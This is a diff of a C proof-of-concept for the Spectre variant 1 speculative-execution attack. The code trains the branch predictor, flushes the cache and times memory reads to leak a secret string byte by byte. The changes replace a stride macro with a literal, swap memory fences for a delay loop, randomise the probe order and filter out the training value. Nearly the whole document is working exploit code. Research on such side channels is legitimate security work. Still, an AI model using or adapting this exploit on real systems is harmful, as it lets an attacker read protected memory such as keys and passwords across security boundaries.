@@ -7,9 +7,6 @@
 #include <x86intrin.h>
 #endif
 
-// #define CHANNLE_STRIDE 4096
-#define CHANNLE_STRIDE 512
-
 int MAX_TRIES = 10;
 unsigned int CACHE_HIT_THRESHOLD = 30;
 
@@ -20,7 +17,7 @@ unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
 uint8_t unused2[64];
-uint8_t array2[256 * CHANNLE_STRIDE];
+uint8_t array2[256 * 512];
 
 char *secret = "The Magic Words are Squeamish Ossifrage.";
 
@@ -30,7 +27,7 @@ void victim_function(size_t x)
 {
 	if (x < array1_size)
 	{
-		temp &= array2[array1[x] * CHANNLE_STRIDE];
+		temp &= array2[array1[x] * 512];
 	}
 }
 
@@ -68,8 +65,7 @@ uint64_t read_cycles()
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 {
 	static int results[256];
-	int tries, i, j, k;
-	int mix_i;
+	int tries, i, j, k, mix_i;
 	unsigned int junk = 0;
 	size_t training_x, x;
 	register uint64_t time1, time2;
@@ -82,7 +78,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		/* Flush array2[256*(0..255)] from cache */
 		for (i = 0; i < 256; i++)
 		{
-			flush_cache(&array2[i * CHANNLE_STRIDE]);
+			flush_cache(&array2[i * 512]);
 		}
 
 		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
@@ -92,11 +88,9 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			flush_cache(&array1_size);
 
 			/* Delay (can also mfence) */
-			#ifdef X86
-			__asm__ volatile ("mfence");
-			#else
-			__asm__ volatile ("dmb ish");
-			#endif
+			for (volatile int z = 0; z < 100; z++)
+			{
+			}
 
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
 			/* Avoid jumps in case those tip off the branch predictor */
@@ -119,8 +113,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		/* Stride prediction causes segmentation faults -- possibly because*/
 		for (i = 0; i < 256; i++)
 		{
-			mix_i = i;
-			addr = &array2[mix_i * CHANNLE_STRIDE];
+			mix_i = ((i * 167) + 13) & 255;
+			addr = &array2[mix_i * 512];
 			#ifdef X86
 			time1 = __rdtscp(&junk);
 			junk = *addr;
@@ -130,7 +124,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			junk = *addr;				   /* MEMORY ACCESS TO TIME */
 			time2 = read_cycles() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 			#endif
-			if (time2 <= CACHE_HIT_THRESHOLD)
+			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 			{
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
 			}
